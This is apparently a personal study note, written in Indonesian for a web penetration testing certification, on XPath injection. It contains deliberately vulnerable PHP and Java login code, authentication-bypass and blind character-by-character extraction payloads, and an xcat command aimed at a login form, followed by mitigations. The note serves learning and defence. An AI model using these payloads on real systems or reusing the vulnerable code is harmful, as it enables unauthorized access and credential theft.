2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prasyarat: [[XML Injection - Attack Types]]
# XPath Injection

## Gambaran singkat

XPath injection terjadi ketika input yang tidak tepercaya disisipkan ke query XPath yang dipakai untuk mencari data pada dokumen XML. Secara konsep mirip SQL injection, tetapi targetnya adalah data store berbasis XML (bukan database relasional).

## Dokumen XML target

```xml
<?xml version="1.0"?>
<users>
  <user>
    <username>admin</username>
    <password>s3cr3t</password>
    <role>administrator</role>
  </user>
  <user>
    <username>john</username>
    <password>pass123</password>
    <role>user</role>
  </user>
  <user>
    <username>jane</username>
    <password>hunter2</password>
    <role>user</role>
  </user>
</users>
```

## Kode rentan

**PHP:**
```php
$username = $_POST['username'];
$password = $_POST['password'];

$xpath = "//users/user[username='" . $username . "' and password='" . $password . "']";
$result = $xml->xpath($xpath);

if ($result) {
    echo "Login successful";
}
```

**Java:**
```java
String query = "//users/user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(query);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## Payload bypass autentikasi

**Basic bypass (in username field):**
```
' or '1'='1
```
Query yang terbentuk: `//users/user[username='' or '1'='1' and password='anything']`

**Full bypass (both fields):**
```
Username: ' or '1'='1
Password: ' or '1'='1
```
Query: `//users/user[username='' or '1'='1' and password='' or '1'='1']`
Mengembalikan semua user — match pertama biasanya login (sering admin).

**Target specific user:**
```
admin' or '1'='1
```
Query: `//users/user[username='admin' or '1'='1' and password='...']`

**Comment-style termination (if supported):**
```
admin']%00
```

## Ekstraksi data

**Ambil semua username:**
```
' or 1=1]/username | //nothing['
```

**Pakai `string-length()` untuk menguji panjang field:**
```
' or string-length(//users/user[1]/password)=6 or '1'='2
```
Bernilai true jika password user pertama panjangnya 6.

**Pakai `substring()` untuk ekstraksi karakter per karakter:**
```
' or substring(//users/user[1]/password,1,1)='s' or '1'='2
```
Bernilai true jika karakter pertama password user pertama adalah 's'.

## Blind XPath Injection

Jika aplikasi tidak mengembalikan hasil query secara langsung, gunakan ekstraksi boolean-based (logikanya sama seperti blind SQLi).

**Step 1: Determine node count**

**Step 1: Tentukan jumlah node**
```
' or count(//users/user)=3 or '1'='2       --> true (3 users)
' or count(//users/user)=4 or '1'='2       --> false
```

**Step 2: Tentukan panjang string**
```
' or string-length(//users/user[1]/password)>4 or '1'='2   --> true
' or string-length(//users/user[1]/password)>6 or '1'='2   --> false
' or string-length(//users/user[1]/password)=6 or '1'='2   --> true (length is 6)
```

**Step 3: Ekstrak karakter satu per satu**
```
' or substring(//users/user[1]/password,1,1)='s' or '1'='2   --> true
' or substring(//users/user[1]/password,2,1)='3' or '1'='2   --> true
' or substring(//users/user[1]/password,3,1)='c' or '1'='2   --> true
...
```
Password yang didapat: `s3cr3t`

## Perbandingan XPath vs SQL injection

| Aspek                | SQL Injection         | XPath Injection          |
|----------------------|----------------------|--------------------------|
| Data store           | Database relasional  | Dokumen XML              |
| Union-based          | UNION SELECT         | `|` (operator union)     |
| Komentar             | `--`, `/* */`        | Tidak ada di XPath 1.0   |
| Boolean blind        | AND 1=1              | or '1'='1'               |
| Ekstraksi string     | SUBSTRING()          | substring()              |
| Tipe/role            | Ada izin DB           | Akses dokumen penuh      |
| Stacked queries      | Mungkin (sebagian DB) | Tidak mungkin            |

Perbedaan kunci: XPath **tidak punya access control** seperti DB. Jika injection berhasil, biasanya aksesnya mencakup seluruh dokumen XML. Tidak ada padanan seperti user DB atau permission tabel.

## Tools

**xcat** — otomasi ekstraksi blind XPath:
```bash
# Install
pip install xcat

# Run
xcat --method POST --body "username=*&password=test" \
     --true-string "Login successful" \
     http://target/login
```

xcat mengotomasi brute force substring/string-length dan mendukung fitur XPath 2.0 jika tersedia.

## Mitigasi

**Parameterized XPath queries (Java):**
```java
// Using XPath variables instead of string concatenation
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();

// Set variable resolver
xpath.setXPathVariableResolver(v -> {
    if (v.getLocalPart().equals("username")) return username;
    if (v.getLocalPart().equals("password")) return password;
    return null;
});

String query = "//users/user[username=$username and password=$password]";
XPathExpression expr = xpath.compile(query);
```

**Validasi input:**
- Tolak atau escape karakter spesial XPath: `'`, `"`, `/`, `[`, `]`, `(`, `)`, `=`
- Whitelist pola input yang diharapkan (mis. alfanumerik untuk username)
- Jangan pernah concatenate input user langsung ke ekspresi XPath

**Arsitektur:**
- Lebih baik pakai database relasional + query ter-parameterisasi daripada menyimpan data sebagai XML flat-file
- Jika XML memang wajib, gunakan XML database (BaseX, eXist-db) yang mendukung parameterisasi dengan benar
